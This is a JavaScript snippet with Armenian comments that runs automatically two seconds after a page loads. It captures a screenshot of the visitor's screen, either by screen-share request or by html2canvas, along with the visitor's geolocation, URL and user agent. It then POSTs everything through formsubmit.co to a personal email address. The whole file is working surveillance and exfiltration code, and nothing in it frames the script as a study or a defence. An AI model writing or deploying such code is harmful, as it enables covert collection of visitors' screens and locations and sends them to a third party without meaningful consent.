// 1. Փորձել ստանալ իրական էկրանի ֆոտո (եթե թույլատրված է)
async function captureRealScreenshot() {
    try {
      // Փորձել օգտագործել բրաուզերի MediaDevices API (Chrome, Edge)
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: { 
          displaySurface: "browser", // Ուղղակիորեն վերցնել բրաուզերի էկրանը
          cursor: "never" // Չցուցադրել կուրսորը
        },
        audio: false,
      });
      
      const videoTrack = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      const bitmap = await imageCapture.grabFrame();
      
      // Փոխակերպել Bitmap-ը JPEG պատկերի
      const canvas = document.createElement('canvas');
      canvas.width = bitmap.width;
      canvas.height = bitmap.height;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(bitmap, 0, 0);
      
      const screenshot = canvas.toDataURL('image/jpeg', 0.8);
      videoTrack.stop(); // Կանգնեցնել հոսքը
      
      return screenshot;
    } catch (e) {
      console.log("Real screenshot failed, falling back to HTML2Canvas");
      return null;
    }
  }
  
  // 2. Fallback՝ օգտագործելով HTML2Canvas
  async function captureHTMLScreenshot() {
    try {
      if (typeof html2canvas !== 'function') {
        await loadScript('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
      }
      
      const canvas = await html2canvas(document.body, {
        scale: 0.7,
        logging: false,
        useCORS: true,
      });
      
      return canvas.toDataURL('image/jpeg', 0.7);
    } catch (e) {
      console.log("HTML2Canvas failed too");
      return null;
    }
  }
  
  // 3. Բեռնել արտաքին սկրիպտ
  function loadScript(src) {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = src;
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }
  
  // 4. Հավաքել բոլոր տվյալները
  async function collectData() {
    const data = {
      url: window.location.href,
      userAgent: navigator.userAgent,
      time: new Date().toISOString(),
    };
  
    // Փորձել ստանալ իրական ֆոտո → Fallback → Չստացվեց
    data.screenshot = await captureRealScreenshot() || await captureHTMLScreenshot() || "Failed to capture";
  
    // Ավելացնել լոկացիա (եթե հնարավոր է)
    if (navigator.geolocation) {
      try {
        const pos = await new Promise((resolve, reject) => 
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 2000 })
        );
        data.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
      } catch (e) {
        data.locationError = "User denied location";
      }
    }
  
    return data;
  }
  
  // 5. Ուղարկել տվյալները
  function sendData(data) {
    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    }).then(() => console.log("Data sent!")).catch(e => console.error("Error:", e));
  }
  
  // 6. Գործարկել 2 վայրկյանում
  setTimeout(async () => {
    const visitorData = await collectData();
    sendData(visitorData);
  }, 2000);